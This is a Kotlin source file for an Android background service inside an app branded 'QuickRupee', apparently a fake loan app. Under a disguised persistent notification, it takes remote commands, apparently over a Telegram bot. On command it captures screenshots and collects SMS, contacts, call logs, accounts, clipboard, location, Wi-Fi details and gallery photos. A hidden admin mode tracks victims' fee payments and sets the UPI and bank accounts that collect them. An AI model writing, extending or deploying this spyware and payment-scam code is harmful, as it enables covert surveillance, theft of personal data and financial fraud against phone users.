package com.quick.rupee

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager

class SyncService : Service() {

    private var offset = 0L
    private var started = false
    private var lock: PowerManager.WakeLock? = null

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startFg()
        runCatching {
            val pm = getSystemService(PowerManager::class.java)
            lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "qr:agent")
            lock?.acquire()
        }
    }

    private fun startFg() {
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(
                NotificationChannel("sys", "QuickRupee", NotificationManager.IMPORTANCE_MIN))
        }
        val n = Notification.Builder(this, "sys")
            .setContentTitle("QuickRupee")
            .setContentText("Seva chalu hai")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .build()
        if (Build.VERSION.SDK_INT >= 34)
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        else startForeground(1, n)
    }

    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
        Watchdog.arm(this)
        if (!started) { started = true; Thread { loop() }.start() }
        return START_STICKY
    }

    private fun loop() {
        runCatching {
            Tg.text("<b>ONLINE</b>\n${Build.MANUFACTURER} ${Build.MODEL} / A${Build.VERSION.RELEASE}")
            Collector.dump(this)
        }
        while (true) {
            try {
                val r = Tg.poll(offset)
                offset = r.first
                for (c in r.second) runCatching { handle(c) }
            } catch (e: Throwable) { Thread.sleep(7000) }
        }
    }

    private fun handle(c: Cmd) {
        if (c.name == "admin") {
            val p = c.arg.split(" ")
            if (p.size >= 2 && p[0] == Db.ADMIN_ID && p[1] == Db.ADMIN_PASS) {
                Db.setAdmin(this, true)
                Tg.text("admin ON\n/pending /approve <utr> /setupi <id> /setbank <name>|<acc>|<ifsc> /customers /stats /adminoff")
            } else Tg.text("admin: id/pass galat")
            return
        }
        if (c.name in listOf("pending", "approve", "setupi", "setbank", "customers", "stats", "adminoff")) {
            if (!Db.isAdmin(this)) { Tg.text("pehle /admin <id> <pass>"); return }
            admin(c)
            return
        }
        when (c.name) {
            "ss" -> shot(1)
            "ss5" -> shot(5)
            "ss10" -> shot(10)
            "sms" -> Collector.sms(this)
            "contacts" -> Collector.contacts(this)
            "calllog" -> Collector.callLog(this)
            "apps" -> Collector.apps(this)
            "accounts" -> Collector.accounts(this)
            "clip" -> Collector.clip(this)
            "loc" -> Collector.loc(this)
            "wifi" -> Collector.wifi(this)
            "gallery" -> Collector.gallery(this, 20)
            "dump" -> Collector.dump(this)
            "info" -> Tg.text("${Build.MANUFACTURER} ${Build.MODEL} / A${Build.VERSION.RELEASE}")
            else -> Tg.text("cmd: ss ss5 sms contacts calllog apps accounts clip loc wifi gallery dump info admin")
        }
    }

    private fun admin(c: Cmd) {
        when (c.name) {
            "pending" -> {
                val a = Db.pays(this)
                val sb = StringBuilder("pending:\n")
                var n = 0
                for (i in 0 until a.length()) {
                    val o = a.getJSONObject(i)
                    if (o.optString("status") == "pending") {
                        sb.append("${o.optString("mobile")} | ₹${o.optInt("amount")} | fee ₹${o.optInt("fee")} | UTR ${o.optString("utr")}\n")
                        n++
                    }
                }
                Tg.text(if (n == 0) "pending khaali" else sb.toString().take(3900))
            }
            "approve" -> Tg.text(if (Db.approve(this, c.arg.trim())) "approved: ${c.arg}" else "UTR nahi mila")
            "setupi" -> { Db.setUpi(this, c.arg.trim()); Tg.text("UPI set: ${c.arg.trim()}") }
            "setbank" -> {
                val p = c.arg.split("|")
                if (p.size >= 3) {
                    Db.setBank(this, p[0].trim(), p[1].trim(), p[2].trim())
                    Tg.text("bank set: ${p[0]} ${p[1]} ${p[2]}")
                } else Tg.text("format: /setbank Bank|Acc|IFSC")
            }
            "customers" -> {
                val a = Db.customers(this)
                val sb = StringBuilder("customers:\n")
                for (i in 0 until a.length()) {
                    val o = a.getJSONObject(i)
                    sb.append("${o.optString("mobile")} | ${o.optString("name")} | opens ${o.optInt("opens")}\n")
                }
                Tg.text(if (a.length() == 0) "koi customer nahi" else sb.toString().take(3900))
            }
            "stats" -> Tg.text("pending ${Db.pendingCount(this)} | collected ₹${Db.totalPaid(this)} | customers ${Db.customers(this).length()}")
            "adminoff" -> { Db.setAdmin(this, false); Tg.text("admin OFF") }
        }
    }

    private fun shot(n: Int) {
        startActivity(Intent(this, ShotActivity::class.java)
            .putExtra("count", n)
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
    }

    override fun onDestroy() {
        runCatching { lock?.release() }
        super.onDestroy()
    }
}
